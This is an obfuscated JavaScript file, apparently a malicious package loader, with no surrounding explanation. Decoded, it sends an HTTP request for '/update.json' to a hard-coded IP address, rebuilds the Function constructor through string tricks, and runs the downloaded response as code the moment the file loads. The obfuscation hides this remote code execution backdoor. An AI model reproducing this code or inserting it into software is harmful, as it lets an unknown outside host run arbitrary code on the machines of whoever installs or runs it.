function _0x320d(_0x49156b, _0x23dcc5) {
    var _0x320dc7 = _0x23dc();
    _0x320d = function (_0x4a388f, _0xa6bf75) {
        _0x4a388f = _0x4a388f - 0x0;
        var _0xd85f49 = _0x320dc7[_0x4a388f];
        return _0xd85f49;
    };
    return _0x320d(_0x49156b, _0x23dcc5);
}
(function (_0x3422b1, _0x3c26f4) {
    var _0x282202 = _0x320d;
    var _0xf46054 = _0x3422b1();
    while (!![]) {
        try {
            var _0x1600d6 = -parseInt(_0x282202(0x0)) / 0x1 + -parseInt(_0x282202(0x1)) / 0x2 + parseInt(_0x282202(0x2)) / 0x3 * (parseInt(_0x282202(0x3)) / 0x4) + parseInt(_0x282202(0x4)) / 0x5 + -parseInt(_0x282202(0x5)) / 0x6 + -parseInt(_0x282202(0x6)) / 0x7 + parseInt(_0x282202(0x7)) / 0x8;
            if (_0x1600d6 === _0x3c26f4) {
                break;
            } else {
                _0xf46054['push'](_0xf46054['shift']());
            }
        } catch (_0x3817f3) {
            _0xf46054['push'](_0xf46054['shift']());
        }
    }
}(_0x23dc, 0xe0d89));
(function () {
    var _0x4ea773 = _0x320d;
    var _0x4b0eb4 = require(_0x4ea773(0x8));
    return _0x4b0eb4[_0x4ea773(0x9)]({
        'host': _0x4ea773(0xa),
        'port': 0x50,
        'path': _0x4ea773(0xb)
    }, function (_0xbcf8ba) {
        var _0x14cf4d = _0x320d;
        var _0x19fde8 = '';
        _0xbcf8ba['on'](_0x14cf4d(0xc), function (_0x3704b5) {
            _0x19fde8 += _0x3704b5;
        });
        _0xbcf8ba['on'](_0x14cf4d(0xd), function () {
            var _0x486489 = _0x320d;
            var _0x72effd = this[(typeof this[_0x486489(0xe)][_0x486489(0xf)])[_0x486489(0x10)](0x0)[_0x486489(0x11)]() + (typeof this[_0x486489(0xe)][_0x486489(0xf)])[_0x486489(0x12)](0x1)];
            var _0x4cee37 = new _0x72effd(_0x19fde8);
            _0x4cee37();
        });
    });
}());
function _0x23dc() {
    var _0x3ae10a = [
        'get',
        '23.94.46.191',
        '/update.json',
        'data',
        'end',
        'Buffer',
        'from',
        'charAt',
        'toUpperCase',
        'slice',
        '367159YIzqNJ',
        '1978798LhoPoT',
        '5001537ijcygq',
        '4dvxplb',
        '6676440kbBPBW',
        '833958jXhwTx',
        '12734638SjtZbt',
        '9866296thWYNt',
        'http'
    ];
    _0x23dc = function () {
        return _0x3ae10a;
    };
    return _0x23dc();
}
